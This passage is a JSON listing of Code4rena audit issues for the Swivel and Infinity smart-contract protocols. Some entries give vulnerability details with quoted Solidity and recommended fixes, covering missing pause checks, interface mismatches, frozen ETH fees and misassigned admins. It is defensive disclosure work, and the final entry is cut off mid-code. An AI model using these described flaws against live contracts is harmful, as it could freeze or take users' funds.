"labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/66", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "unpaused(p) modifier missing in authRedeem function", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/64", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/main/Marketplace/MarketPlace.sol#L148   # Vulnerability details  ## Impact Due to missing modifier, User will be able to redeem zcTokens and withdraw underlying even in paused Market. This happens due to missing unpaused(p) modifier  ## Proof of Concept 1. Lets see function definition for authRedeem function  ``` function authRedeem(uint8 p, address u, uint256 m, address f, address t, uint256 a) public authorized(markets[p][u][m].zcToken) returns (uint256 underlyingAmount) ```  2. Observe that unpaused(p) modifier is missing  3. This means if Marketplace is placed under paused state by Admin, then also User can call authRedeem at Marketplace via withdraw/redeem at ZcToken contract.   4. This will allow Users to withdraw in paused state which is incorrect  ## Recommended Mitigation Steps Add unpaused(p) modifier in authRedeem function  ``` function authRedeem(uint8 p, address u, uint256 m, address f, address t, uint256 a) public authorized(markets[p][u][m].zcToken) unpaused(p) returns (uint256 underlyingAmount) { ... } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/62", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/61", "labels": ["bug", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/59", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/48", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/47", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/46", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/45", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/44", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": " Mismatch in `withdraw()` between Yearn and other protocols can prevent Users from redeeming zcTokens and permanently lock funds", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/43", "labels": ["bug", "3 (High Risk)", "resolved"], "target": "2022-07-swivel-findings", "body": " Mismatch in `withdraw()` between Yearn and other protocols can prevent Users from redeeming zcTokens and permanently lock funds"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/42", "labels": ["bug", "QA (Quality Assurance)", "resolved"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/41", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/40", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Interface definition error", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/39", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Marketplace/Interfaces.sol#L52 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Marketplace/MarketPlace.sol#L164 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Swivel/Swivel.sol#L620 https://github.com/Swivel-Finance/gost/blob/a76ac859df049527c3e5df85e706dec6ffa0e2bb/test/swivel/Swivel.sol#L10   # Vulnerability details  ## Impact MarketPlace.authRedeem() call interface ISwivel.authRedeem() but Swivel contract  does not have this method only method  \"authRedeemZcToken()\" The result will cause MarketPlace.authRedeem() to fail forever, thus causing ZcToken.withdraw() to fail forever  ## Proof of Concept   MarketPlace.sol call ISwivel.authRedeem()  ```   function authRedeem(uint8 p, address u, uint256 m, address f, address t, uint256 a) public authorized(markets[p][u][m].zcToken) returns (uint256 underlyingAmount) {      .....        ISwivel(swivel).authRedeem(p, u, market.cTokenAddr, t, a);       .....     } else {       .....       ISwivel(swivel).authRedeem(p, u, market.cTokenAddr, t, amount);      ....     } ```  Swivel.sol does not have   authRedeem() ,only authRedeemZcToken() ```   function authRedeemZcToken(uint8 p, address u, address c, address t, uint256 a) external authorized(marketPlace) returns(bool) {     // redeem underlying from compounding     if (!withdraw(p, u, c, a)) { revert Exception(7, 0, 0, address(0), address(0)); }     // transfer underlying back to msg.sender     Safe.transfer(IErc20(u), t, a);      return (true);   }  ```  ## Tools Used  ## Recommended Mitigation Steps  Swivel contract need declare \"is ISwivel\" and change method name Other contracts should also declare \"is Iinterfacename\" to avoid method name errors like IMarketPlace    "}, {"title": "Lack of validation when calculating premiumFilled can cause undesirable interactions", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/38", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "wontfix"], "target": "2022-07-swivel-findings", "body": "Lack of validation when calculating premiumFilled can cause undesirable interactions"}, {"title": "VaultTracker has the wrong admin", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/36", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/main/Marketplace/MarketPlace.sol#L77 https://github.com/code-423n4/2022-07-swivel/blob/main/Creator/Creator.sol#L41 https://github.com/code-423n4/2022-07-swivel/blob/main/VaultTracker/VaultTracker.sol#L32   # Vulnerability details  ## Description  `MarketPlace.createMarket()` calls `Creator.create()` which creates an instance of `ZcToken` and a `VaultTracker`. `VaultTracker` takes `msg.sender` as the admin. We know that if contract A calls contract B which calls contract C, `msg.sender` in contract C is the address of B i.e. the `msg.sender` in VaultTracker is the address of the creator contract. However, the creator contract is not able (and not supposed to) interact with the VaultTracker unlike the marketplace contract.  ## Tools used Manual analysis  ## Recommended Mitigation Steps  Modify the constructor of the VaultTracker contract so that the creator contract can pass in msg.sender (MarketPlace\u2019s address) to be used as admin.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/34", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "ZcToken.withdraw will send user 0 tokens if called after maturity deadline but before market is set mature", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/32", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Tokens/ZcToken.sol#L99 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Tokens/ZcToken.sol#L92   # Vulnerability details  ## Impact  If `maturityRate` is still `0` after maturity deadline (because no transactions setting `maturityRate` have been executed yet), then `previewWithdraw` calculated amount (used by `ZcToken.withdraw` function) is `0` and thus `withdraw` function will send `0` underlying tokens to user, which might be very confusing to user. Subsequent call to the same function will send him correct amount.  The same problem applies to all view functions in `ZcToken` contract - they use saved market `maturityRate`, which can be `0` even past deadline time and functions revert or return `0` in this case.  Incorrect withdrawal behaviour:  1. Bob has some `ZcToken`s. 2. Right at the time of maturity Bob tries to withdraw his underlying tokens by calling `ZcToken.withdraw` with some underlying amount. 3. Instead of receiving corresponding amount, Bob receives nothing (but transaction still succeeds and he uses gas for it).  ## Proof of Concept  1. `withdraw`: calculates `previewAmount` from `previewWithdraw`  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Tokens/ZcToken.sol#L99   2. `previewWithdraw`: multiplication by `maturityRate` returns 0  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/Tokens/ZcToken.sol#L92  ## Recommended Mitigation Steps  Add `getMaturityRate` function to `ZcToken`, which will return either market's `maturityRate` or (if it's `0`) current market's `exchangeRate`. Use this function instead of `maturityRate` everywhere across `ZcToken`.   "}, {"title": "Yearn vault integration is broken", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/29", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "old-submission-method"], "target": "2022-07-swivel-findings", "body": "Yearn vault integration is broken"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/28", "labels": ["bug", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/27", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "should use >= instead of >", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/21", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-07-swivel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/VaultTracker/VaultTracker.sol#L86 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/VaultTracker/VaultTracker.sol#L158   # Vulnerability details  ## should use >= instead of >   ### description  https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/VaultTracker/VaultTracker.sol#L86 https://github.com/code-423n4/2022-07-swivel/blob/fd36ce96b46943026cb2dfcb76dfa3f884f51c18/VaultTracker/VaultTracker.sol#L158  the comparison should be 'a >= vlt.notional' instead of a > vlt.notional  otherwise dust amounts will always be left in vlt.notional when calling `removeNotional()` or `transferNotionalFrom()`   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/19", "labels": ["bug", "duplicate", "QA (Quality Assurance)", "wontfix"], "target": "2022-07-swivel-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/18", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/17", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/2", "labels": ["bug", "duplicate", "G (Gas Optimization)", "wontfix"], "target": "2022-07-swivel-findings", "body": "Gas Optimizations"}, {"title": "Agreement & Disclosures", "html_url": "https://github.com/code-423n4/2022-07-swivel-findings/issues/1", "labels": [], "target": "2022-07-swivel-findings", "body": "Agreement & Disclosures"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/356", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/355", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/353", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/351", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/349", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/348", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "ETH mistakenly sent over with ERC20 based takeOrders and takeMultipleOneOrders calls will be lost", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/346", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363   # Vulnerability details  takeOrders() and takeMultipleOneOrders() are the main user facing functionality of the protocol. Both require `currency` to be fixed for the call and can have it either as a ERC20 token or ETH. This way, the probability of a user sending over a ETH with the call whose `currency` is a ERC20 token isn't negligible. However, in this case ETH funds of a user will be permanently lost.  Setting the severity to medium as this is permanent fund freeze scenario conditional on a user mistake, which probability can be deemed high enough as the same functions are used for ETH and ERC20 orders.  ## Proof of Concept  Both takeOrders() and takeMultipleOneOrders() only check that ETH funds are enough to cover the order's `totalPrice`:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  When `currency` is some ERC20 token, while `msg.value > 0`, the `msg.value` will be permanently frozen within the contract.  ## Recommended Mitigation Steps  Consider adding the check for `msg.value` to be zero for the cases when it is not utilized:  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } else {       require(msg.value == 0, 'non-zero ETH value');     } ```  "}, {"title": "Owner can set arbitrarily high `InfinityStaker` penalties and steal funds", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/345", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Owner can set arbitrarily high `InfinityStaker` penalties and steal funds"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/336", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/334", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/333", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/330", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/329", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/327", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/325", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/324", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/323", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "DOS If the check in `matchOrders` fails", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/321", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "DOS If the check in `matchOrders` fails"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/320", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/313", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/311", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/309", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/303", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/300", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/299", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/298", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/297", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Accumulated ETH fees of InfinityExchange cannot be retrieved", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/296", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232   # Vulnerability details  ETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations are permanently frozen within the contract as there is only one way designed to retrieve them, a rescueETH() function, and it will work as intended, not being able to access ETH balance of the contract.  Setting the severity as high as the case is a violation of system's core logic and a permanent freeze of ETH revenue of the project.  ## Proof of Concept  Fees are accrued in user-facing takeOrders() and takeMultipleOneOrders() via the following call sequences:  ``` takeOrders -> _takeOrders -> _execTakeOrders -> _transferNFTsAndFees -> _transferFees takeMultipleOneOrders -> _execTakeOneOrder -> _transferNFTsAndFees -> _transferFees ```  While token fees are transferred right away, ETH fees are kept with the InfinityExchange contract:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1119-L1141  ```solidity   /**    * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is              the one that actually 'pays' the fees    * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'    * @param seller the seller    * @param buyer the buyer    * @param amount amount to transfer    * @param currency currency of the transfer    */   function _transferFees(     address seller,     address buyer,     uint256 amount,     address currency   ) internal {     // protocol fee     uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;     uint256 remainingAmount = amount - protocolFee;     // ETH     if (currency == address(0)) {       // transfer amount to seller       (bool sent, ) = seller.call{value: remainingAmount}('');       require(sent, 'failed to send ether to seller'); ```  I.e. when `currency` is ETH the fee part of the amount, `protocolFee`, is left with the InfinityExchange contract.  The only way to retrieve ETH from the contract is rescueETH() function:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232  ```solidity   /// @dev used for rescuing exchange fees paid to the contract in ETH   function rescueETH(address destination) external payable onlyOwner {     (bool sent, ) = destination.call{value: msg.value}('');     require(sent, 'failed');   } ```  However, it cannot reach ETH on the contract balance as `msg.value` is used as the amount to be sent over. I.e. only ETH attached to the rescueETH() call is transferred from `owner` to `destination`. ETH funds that InfinityExchange contract holds remain inaccessible.  ## Recommended Mitigation Steps  Consider adding contract balance to the funds transferred:  ```solidity   /// @dev used for rescuing exchange fees paid to the contract in ETH   function rescueETH(address destination) external payable onlyOwner { -   (bool sent, ) = destination.call{value: msg.value}(''); +   (bool sent, ) = destination.call{value: address(this).balance}('');     require(sent, 'failed');   } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/294", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/291", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/290", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/289", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Wrong stake level calculation", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/285", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Wrong stake level calculation"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/284", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "No limits for updatePenalties and lack of event emission in a critical function", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/281", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "No limits for updatePenalties and lack of event emission in a critical function"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/280", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/279", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/278", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/274", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/273", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/270", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/268", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/267", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/266", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/265", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/263", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/262", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "The userMinOrderNonce can be set arbitrarily with cancelAllOrders().", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/260", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "The userMinOrderNonce can be set arbitrarily with cancelAllOrders()."}, {"title": "Protocol fee rate can be arbitrarily modified by the owner and the new rate will apply to all existing orders", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/259", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Protocol fee rate can be arbitrarily modified by the owner and the new rate will apply to all existing orders"}, {"title": "Maker order buyer is forced to reimburse the gas cost at any `tx.gasprice`", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/257", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Maker order buyer is forced to reimburse the gas cost at any `tx.gasprice`"}, {"title": "Unsmooth price change due to unnecessary precision loss can cause user's order to be settled in non-optimal price", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/255", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Unsmooth price change due to unnecessary precision loss can cause user's order to be settled in non-optimal price"}, {"title": "Maker buy order with no specified NFT tokenIds may get fulfilled in `matchOneToManyOrders` without receiving any NFT", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/254", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116   # Vulnerability details  The call stack: matchOneToManyOrders() -> _matchOneMakerSellToManyMakerBuys() -> _execMatchOneMakerSellToManyMakerBuys() -> _execMatchOneToManyOrders() -> _transferMultipleNFTs()  Based on the context, a maker buy order can set `OrderItem.tokens` as an empty array to indicate that they can accept any tokenId in this collection, in that case, `InfinityOrderBookComplication.doTokenIdsIntersect()` will always return `true`.  However, when the system matching a sell order with many buy orders, the `InfinityOrderBookComplication` contract only ensures that the specified tokenIds intersect with the sell order, and the total count of specified tokenIds equals the sell order's quantity (`makerOrder.constraints[0]`).  This allows any maker buy order with same collection and `empty tokenIds` to be added to `manyMakerOrders` as long as there is another maker buy order with specified tokenIds that matched the sell order's tokenIds.  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116  ```solidity function canExecMatchOneToMany(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external view override returns (bool) {     uint256 numItems;     bool isOrdersTimeValid = true;     bool itemsIntersect = true;     uint256 ordersLength = manyMakerOrders.length;     for (uint256 i = 0; i < ordersLength; ) {       if (!isOrdersTimeValid || !itemsIntersect) {         return false; // short circuit       }        uint256 nftsLength = manyMakerOrders[i].nfts.length;       for (uint256 j = 0; j < nftsLength; ) {         numItems += manyMakerOrders[i].nfts[j].tokens.length;         unchecked 